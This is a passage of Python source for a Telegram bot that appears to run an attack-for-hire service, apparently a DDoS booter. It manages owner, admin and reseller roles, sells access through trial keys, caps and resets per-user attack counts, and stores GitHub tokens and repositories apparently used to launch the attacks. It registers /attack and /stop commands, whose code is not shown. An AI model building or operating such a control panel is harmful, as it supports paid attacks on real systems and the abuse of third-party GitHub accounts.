            "• /removetoken <ɪɴᴅᴇx> - ʀᴇᴍᴏᴠᴇ ᴛᴏᴋᴇɴ\n"
        )
        
    await update.message.reply_text(help_text)


async def myaccess(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if is_owner(user_id):
        role = "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "🛡️ ᴀᴅᴍɪɴ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_reseller(user_id):
        role = "💰 ʀᴇsᴇʟʟᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_approved_user(user_id):
        role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀ"
        exp_time = approved_users[user_id]['expiry']
        if exp_time == "LIFETIME":
            expiry = "ʟɪғᴇᴛɪᴍᴇ"
        else:
            expiry = datetime.fromtimestamp(exp_time).strftime('%Y-%m-%d %H:%M:%S')
    else:
        role = "❌ ɴᴏ ᴀᴄᴄᴇss"
        expiry = "ɴ/ᴀ"
        
    await update.message.reply_text(
        "🎫 **ʏᴏᴜʀ ᴀᴄᴄᴇss ɪɴғᴏ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 ʀᴏʟᴇ: `{role}`\n"
        f"⏳ ᴇxᴘɪʀʏ: `{expiry}`\n"
        f"🎯 ᴀᴛᴛᴀᴄᴋs: `{user_attack_counts.get(user_id, 0)}/{MAX_ATTACKS}`"
    )


async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if len(context.args) < 1:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /add <ɪᴅ> [ᴅᴀʏs]")
        return

    target_id = context.args[0]
    days = 7
    if len(context.args) > 1:
        try:
            days = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ ᴅᴀʏs ᴍᴜsᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ.")
            return

    expiry = time.time() + (days * 86400)
    approved_users[target_id] = {
        "username": f"user_{target_id}",
        "added_by": user_id,
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": days
    }
    save_approved_users(approved_users)
    
    
    global pending_users
    pending_users = [u for u in pending_users if str(u['user_id']) != str(target_id)]
    save_pending_users(pending_users)
    
    await update.message.reply_text(f"✅ **ᴜsᴇʀ ᴀᴅᴅᴇᴅ!**\n━━━━━━━━━━━━━━━━━━━━━━\nɪᴅ: `{target_id}`\nᴅᴜʀᴀᴛɪᴏɴ: `{days} ᴅᴀʏs`\nᴇxᴘɪʀʏ: `{datetime.fromtimestamp(expiry).strftime('%Y-%m-%d')}`")
    
    try:
        await context.bot.send_message(
            chat_id=int(target_id),
            text=f"🎉 **ᴀᴄᴄᴇss ɢʀᴀɴᴛᴇᴅ!**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ɢɪᴠᴇɴ `{days} ᴅᴀʏs` ᴏғ ᴀᴄᴄᴇss.\nᴜsᴇ /help ᴛᴏ sᴇᴇ ᴄᴏᴍᴍᴀɴᴅs."
        )
    except:
        pass


async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if len(context.args) < 1:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /remove <ɪᴅ>")
        return

    target_id = context.args[0]
    if target_id in approved_users:
        del approved_users[target_id]
        save_approved_users(approved_users)
        await update.message.reply_text(f"✅ **ᴜsᴇʀ ʀᴇᴍᴏᴠᴇᴅ!**\n━━━━━━━━━━━━━━━━━━━━━━\nɪᴅ: `{target_id}`")
    else:
        await update.message.reply_text("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ.")


async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not approved_users:
        await update.message.reply_text("∅ **ɴᴏ ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs.**")
        return

    msg = "📋 **ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, info in approved_users.items():
        if info['expiry'] == "LIFETIME":
            exp = "ʟɪғᴇᴛɪᴍᴇ"
        else:
            exp = datetime.fromtimestamp(info['expiry']).strftime('%Y-%m-%d')
        msg += f"• `{uid}` | ᴇxᴘ: `{exp}`\n"
    
    await update.message.reply_text(msg)


async def list_pending(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not pending_users:
        await update.message.reply_text("∅ **ɴᴏ ᴘᴇɴᴅɪɴɢ ʀᴇǫᴜᴇsᴛs.**")
        return

    msg = "📥 **ᴘᴇɴᴅɪɴɢ ʀᴇǫᴜᴇsᴛs:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for user in pending_users:
        msg += f"• @{user['username']} | ɪᴅ: `{user['user_id']}`\n"
    
    await update.message.reply_text(msg)


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /broadcast <ᴍᴇssᴀɢᴇ>")
        return

    message = " ".join(context.args)
    broadcast_msg = f"📢 **ʙʀᴏᴀᴅᴄᴀsᴛ ғʀᴏᴍ ᴀᴅᴍɪɴ**\n━━━━━━━━━━━━━━━━━━━━━━\n\n{message}"
    
    
    all_users = set(approved_users.keys()) | set(owners.keys()) | set(admins.keys()) | set(resellers.keys())
    
    success = 0
    fail = 0
    for uid in all_users:
        try:
            await context.bot.send_message(chat_id=int(uid), text=broadcast_msg)
            success += 1
        except:
            fail += 1
            
    await update.message.reply_text(f"✅ **ʙʀᴏᴀᴅᴄᴀsᴛ sᴇɴᴛ!**\n━━━━━━━━━━━━━━━━━━━━━━\n✅ sᴜᴄᴄᴇss: `{success}`\n❌ ғᴀɪʟᴇᴅ: `{fail}`")


async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /genkey <ʜᴏᴜʀs>")
        return

    try:
        hours = int(context.args[0])
        key = generate_trial_key(hours)
        await update.message.reply_text(
            f"🔑 **ɴᴇᴡ ᴛʀɪᴀʟ ᴋᴇʏ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ᴋᴇʏ: `{key}`\n"
            f"ᴅᴜʀᴀᴛɪᴏɴ: `{hours} ʜᴏᴜʀs`\n\n"
            f"ᴜsᴇ: `/redeem {key}`"
        )
    except ValueError:
        await update.message.reply_text("❌ ʜᴏᴜʀs ᴍᴜsᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ.")


async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not trial_keys:
        await update.message.reply_text("∅ **ɴᴏ ᴋᴇʏs ᴇxɪsᴛ.**")
        return

    msg = "🔑 **ᴀʟʟ ᴛʀɪᴀʟ ᴋᴇʏs:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for key, data in list(trial_keys.items())[-10:]: 
        status = "✅ ᴀᴠᴀɪʟᴀʙʟᴇ" if not data['used'] else f"❌ ᴜsᴇᴅ ʙʏ `{data['used_by']}`"
        msg += f"• `{key}` | `{data['hours']}ʜ` | {status}\n"
    
    await update.message.reply_text(msg)


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /redeem <ᴋᴇʏ>")
        return

    key = context.args[0]
    success, message = redeem_trial_key(key, user_id)
    await update.message.reply_text(message)


async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /maintenance <on/off>")
        return

    global MAINTENANCE_MODE
    mode = context.args[0].lower()
    if mode == "on":
        MAINTENANCE_MODE = True
        save_maintenance_mode(True)
        await update.message.reply_text("🔧 **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ: ᴏɴ**")
    elif mode == "off":
        MAINTENANCE_MODE = False
        save_maintenance_mode(False)
        await update.message.reply_text("✅ **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ: ᴏғғ**")


async def setcooldown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /setcooldown <sᴇᴄᴏɴᴅs>")
        return

    try:
        global COOLDOWN_DURATION
        COOLDOWN_DURATION = int(context.args[0])
        save_cooldown(COOLDOWN_DURATION)
        await update.message.reply_text(f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ sᴇᴛ ᴛᴏ:** `{COOLDOWN_DURATION}s`")
    except ValueError:
        await update.message.reply_text("❌ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴀ ɴᴜᴍʙᴇʀ.")


async def setmaxattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /setmaxattacks <ɴᴜᴍʙᴇʀ>")
        return

    try:
        global MAX_ATTACKS
        MAX_ATTACKS = int(context.args[0])
        save_max_attacks(MAX_ATTACKS)
        await update.message.reply_text(f"🎯 **ᴍᴀx ᴀᴛᴛᴀᴄᴋs sᴇᴛ ᴛᴏ:** `{MAX_ATTACKS}`")
    except ValueError:
        await update.message.reply_text("❌ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴀ ɴᴜᴍʙᴇʀ.")


async def resetattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    global user_attack_counts
    user_attack_counts = {}
    save_user_attack_counts(user_attack_counts)
    await update.message.reply_text("🔄 **ᴀʟʟ ᴀᴛᴛᴀᴄᴋ ᴄᴏᴜɴᴛs ʜᴀᴠᴇ ʙᴇᴇɴ ʀᴇsᴇᴛ!**")


async def addowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_primary_owner(user_id):
        await update.message.reply_text("❌ ᴏɴʟʏ ᴛʜᴇ **ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ** ᴄᴀɴ ᴀᴅᴅ ɴᴇᴡ ᴏᴡɴᴇʀs.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /addowner <ɪᴅ>")
        return

    target_id = context.args[0]
    owners[target_id] = {
        "username": f"owner_{target_id}",
        "added_by": user_id,
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "is_primary": False
    }
    save_owners(owners)
    await update.message.reply_text(f"👑 **ɴᴇᴡ ᴏᴡɴᴇʀ ᴀᴅᴅᴇᴅ:** `{target_id}`")


async def deleteowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_primary_owner(user_id):
        await update.message.reply_text("❌ ᴏɴʟʏ ᴛʜᴇ **ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ** ᴄᴀɴ ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀs.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /deleteowner <ɪᴅ>")
        return

    target_id = context.args[0]
    if target_id in owners:
        if owners[target_id].get("is_primary", False):
            await update.message.reply_text("❌ ᴄᴀɴɴᴏᴛ ʀᴇᴍᴏᴠᴇ ᴛʜᴇ ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ.")
            return
        del owners[target_id]
        save_owners(owners)
        await update.message.reply_text(f"✅ **ᴏᴡɴᴇʀ ʀᴇᴍᴏᴠᴇᴅ:** `{target_id}`")
    else:
        await update.message.reply_text("❌ ᴏᴡɴᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ.")


async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ᴀᴅᴅ ᴀᴅᴍɪɴs.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /addadmin <ɪᴅ>")
        return

    target_id = context.args[0]
    admins[target_id] = {
        "username": f"admin_{target_id}",
        "added_by": user_id,
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    save_admins(admins)
    await update.message.reply_text(f"🛡️ **ɴᴇᴡ ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ:** `{target_id}`")


async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴs.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /removeadmin <ɪᴅ>")
        return

    target_id = context.args[0]
    if target_id in admins:
        del admins[target_id]
        save_admins(admins)
        await update.message.reply_text(f"✅ **ᴀᴅᴍɪɴ ʀᴇᴍᴏᴠᴇᴅ:** `{target_id}`")
    else:
        await update.message.reply_text("❌ ᴀᴅᴍɪɴ ɴᴏᴛ ғᴏᴜɴᴅ.")


async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ᴀᴅᴅ ʀᴇsᴇʟʟᴇʀs.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /addreseller <ɪᴅ>")
        return

    target_id = context.args[0]
    resellers[target_id] = {
        "username": f"reseller_{target_id}",
        "added_by": user_id,
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    save_resellers(resellers)
    await update.message.reply_text(f"💰 **ɴᴇᴡ ʀᴇsᴇʟʟᴇʀ ᴀᴅᴅᴇᴅ:** `{target_id}`")


async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ʀᴇᴍᴏᴠᴇ ʀᴇsᴇʟʟᴇʀs.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /removereseller <ɪᴅ>")
        return

    target_id = context.args[0]
    if target_id in resellers:
        del resellers[target_id]
        save_resellers(resellers)
        await update.message.reply_text(f"✅ **ʀᴇsᴇʟʟᴇʀ ʀᴇᴍᴏᴠᴇᴅ:** `{target_id}`")
    else:
        await update.message.reply_text("❌ ʀᴇsᴇʟʟᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ.")


async def addtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ᴀᴅᴅ ᴛᴏᴋᴇɴs.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /addtoken <ɢɪᴛʜᴜʙ_ᴛᴏᴋᴇɴ> <ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘᴏ_ɴᴀᴍᴇ>")
        return

    token = context.args[0]
    repo_path = context.args[1] 
    
    try:
        username = repo_path.split('/')[0]
        repo_name = repo_path.split('/')[1]
    except IndexError:
        await update.message.reply_text("❌ ᴘʟᴇᴀsᴇ ᴜsᴇ ғᴏʀᴍᴀᴛ: `ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘᴏ_ɴᴀᴍᴇ`")
        return

    msg = await update.message.reply_text("🔄 **ᴠᴇʀɪғʏɪɴɢ ᴛᴏᴋᴇɴ & ʀᴇᴘᴏ...**")
    
    try:
        g = Github(token)
        user = g.get_user()
        repo = user.get_repo(repo_name)
        
        github_tokens.append({
            "token": token,
            "username": username,
            "repo": f"{username}/{repo_name}",
            "added_by": user_id,
            "added_at": time.strftime("%Y-%m-%d %H:%M:%S")
        })
        save_github_tokens(github_tokens)
        await msg.edit_text(f"✅ **ᴛᴏᴋᴇɴ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n━━━━━━━━━━━━━━━━━━━━━━\n👤 ᴜsᴇʀ: `{username}`\n📦 ʀᴇᴘᴏ: `{repo_name}`")
    except Exception as e:
        await msg.edit_text(f"❌ **ᴇʀʀᴏʀ:** {str(e)}")


async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not github_tokens:
        await update.message.reply_text("∅ **ɴᴏ ᴛᴏᴋᴇɴs ᴀᴅᴅᴇᴅ.**")
        return

    msg = "🔑 **ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴs:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for i, t in enumerate(github_tokens):
        msg += f"{i}. `{t['username']}` | `{t['repo']}`\n"
    
    await update.message.reply_text(msg)


async def removetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not context.args:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /removetoken <ɪɴᴅᴇx>")
        return

    try:
        idx = int(context.args[0])
        removed = github_tokens.pop(idx)
        save_github_tokens(github_tokens)
        await update.message.reply_text(f"✅ **ᴛᴏᴋᴇɴ ʀᴇᴍᴏᴠᴇᴅ:** `{removed['repo']}`")
    except (ValueError, IndexError):
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ɪɴᴅᴇx.")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    
    pass


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")


def main():
    application = Application.builder().token(BOT_TOKEN).build()

    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess))
    application.add_handler(CommandHandler("status", status))
    
    
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop_command))
    
    
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("pending", list_pending))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("maintenance", maintenance_command))
    application.add_handler(CommandHandler("setcooldown", setcooldown_command))
    application.add_handler(CommandHandler("setmaxattacks", setmaxattacks_command))
    application.add_handler(CommandHandler("resetattacks", resetattacks_command))
    
    
    application.add_handler(CommandHandler("genkey", genkey_command))
    application.add_handler(CommandHandler("keys", keys_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    
    
    application.add_handler(CommandHandler("addowner", addowner_command))
    application.add_handler(CommandHandler("deleteowner", deleteowner_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("removeadmin", removeadmin_command))
    application.add_handler(CommandHandler("addreseller", addreseller_command))
    application.add_handler(CommandHandler("removereseller", removereseller_command))
    
    
    application.add_handler(CommandHandler("addtoken", addtoken_command))
    application.add_handler(CommandHandler("tokens", tokens_command))
    application.add_handler(CommandHandler("removetoken", removetoken_command))
    
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    application.add_error_handler(error_handler)

    print("🤖 **ᴛʜᴇ ʙᴏᴛ ɪs ʀᴜɴɴɪɴɢ...**")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    application.run_polling()

if __name__ == '__main__':
    main()
